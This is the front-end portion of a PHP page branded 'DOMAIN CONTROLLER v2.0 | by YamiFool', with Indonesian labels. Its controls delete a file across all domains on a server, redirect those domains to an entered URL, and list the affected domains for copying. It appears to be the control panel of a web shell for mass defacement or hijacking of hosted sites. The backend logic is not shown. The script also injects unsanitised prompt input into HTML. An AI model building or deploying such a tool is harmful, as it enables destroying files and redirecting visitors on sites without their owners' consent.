                <button type="submit" class="btn delete">🗑️ DELETE FILE IN ALL DOMAINS</button>
            </div>
        </form>
        
        <?php if (isset($response['domains']) && !empty($response['domains'])): ?>
            <div class="results">
                <h3>📋 HASIL OPERASI (<?php echo $response['count']; ?> DOMAIN)</h3>
                <div class="domain-list" id="domainList">
                    <?php foreach ($response['domains'] as $domain): ?>
                        https://<?php echo htmlspecialchars($domain); ?><br>
                    <?php endforeach; ?>
                </div>
                <button type="button" class="copy-btn" onclick="copyDomains()">
                    📋 COPY ALL DOMAINS
                </button>
                <div class="stats">
                    <span>Total: <?php echo $response['count']; ?> domain</span>
                    <span>Status: ✅ Berhasil</span>
                </div>
            </div>
        <?php endif; ?>
        
        <div class="footer">
            DOMAIN CONTROLLER v2.0 | by YamiFool
        </div>
    </div>

    <script>
        function searchPrompt() {
            const username = prompt("MASUKKAN NAMA ANDA:");
            if (username && username.trim()) {
                const form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="action" value="search"><input type="hidden" name="username" value="' + username.trim() + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }

        function redirectPrompt() {
            const url = prompt("MASUKKAN URL TUJUAN REDIRECT:\nContoh: https://google.com");
            if (url && url.trim()) {
                const form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="action" value="redirect"><input type="hidden" name="redirect_url" value="' + url.trim() + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function copyDomains() {
            const domainList = document.getElementById('domainList');
            const text = domainList.innerText;
            
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text).then(() => {
                    const btn = document.querySelector('.copy-btn');
                    const originalText = btn.textContent;
                    btn.textContent = '✓ COPIED!';
                    setTimeout(() => {
                        btn.textContent = originalText;
                    }, 2000);
                });
            } else {
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                
                const btn = document.querySelector('.copy-btn');
                const originalText = btn.textContent;
                btn.textContent = '✓ COPIED!';
                setTimeout(() => {
                    btn.textContent = originalText;
                }, 2000);
            }
        }
    </script>
</body>
</html>
